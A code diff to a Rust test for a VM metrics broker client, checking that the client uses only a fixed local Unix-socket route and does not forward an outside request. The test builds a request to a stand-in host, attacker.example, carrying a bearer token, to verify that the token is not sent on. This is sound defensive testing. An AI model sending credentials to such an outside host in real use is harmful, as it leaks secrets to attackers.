@@ -35,7 +35,8 @@ async fn broker_client_uses_only_the_fixed_local_route_and_protobuf_body() {
         .route("/internal/vms/{id}/metrics", post(receive))
         .with_state(Arc::clone(&received));
     let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
-    let client = ServiceMetricClient::new(socket, "vm-a").unwrap();
+    let stream = std::os::unix::net::UnixStream::connect(socket).unwrap();
+    let client = ServiceMetricClient::new(stream, "vm-a").unwrap();
     let request = http::Request::post("https://attacker.example/v1/metrics")
         .header(http::header::CONTENT_TYPE, "text/plain")
         .header(http::header::AUTHORIZATION, "Bearer must-not-cross")
